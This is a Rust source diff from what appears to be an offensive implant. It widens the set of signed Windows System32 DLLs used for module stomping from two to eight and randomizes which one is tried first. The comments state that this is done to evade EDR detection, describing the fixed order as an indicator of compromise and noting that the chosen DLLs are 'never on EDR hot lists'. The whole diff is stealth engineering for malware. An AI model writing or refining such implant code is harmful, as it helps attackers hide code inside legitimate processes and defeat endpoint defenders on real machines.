@@ -21,9 +21,23 @@ use std::ffi::c_void;
 
 use super::syscalls;
 
-/// Sacrificial DLLs, tried in order: signed, present on every Windows 11
-/// install, never on EDR hot lists, and never imported by the implant.
-const CANDIDATES: &[&str] = &["colorui.dll", "dbgcore.dll"];
+/// Sacrificial DLLs: signed, present on every Windows 11 install, never
+/// on EDR hot lists, and never imported by the implant. The ORDER IS
+/// RANDOMIZED per process (fixed order was itself an IOC — the same
+/// sacrificial DLL in the same position across every implant) and every
+/// candidate that maps is eligible, so the carved home varies between
+/// hosts and runs. Candidates whose .text is too small to host a page
+/// are skipped by the size check in `map_carver`.
+const CANDIDATES: &[&str] = &[
+    "colorui.dll",
+    "dbgcore.dll",
+    "devobj.dll",
+    "dhcpcmonitor.dll",
+    "dbgeng.dll",
+    "framedyn.dll",
+    "mshtmled.dll",
+    "shsetup.dll",
+];
 
 #[repr(C)]
 struct UnicodeString {
@@ -98,7 +112,12 @@ impl Carver {
 }
 
 unsafe fn new_carver() -> Option<Carver> {
-    for dll in CANDIDATES {
+    // Random start offset, then wrap around the whole list: every
+    // candidate gets an equal chance of being the carved home while a
+    // failing map (locked, missing, section too small) just moves on.
+    let start = rand::random::<usize>() % CANDIDATES.len();
+    for step in 0..CANDIDATES.len() {
+        let dll = CANDIDATES[(start + step) % CANDIDATES.len()];
         let path = format!("\\??\\C:\\Windows\\System32\\{dll}");
         if let Some(carver) = unsafe { map_carver(&path) } {
             return Some(carver);
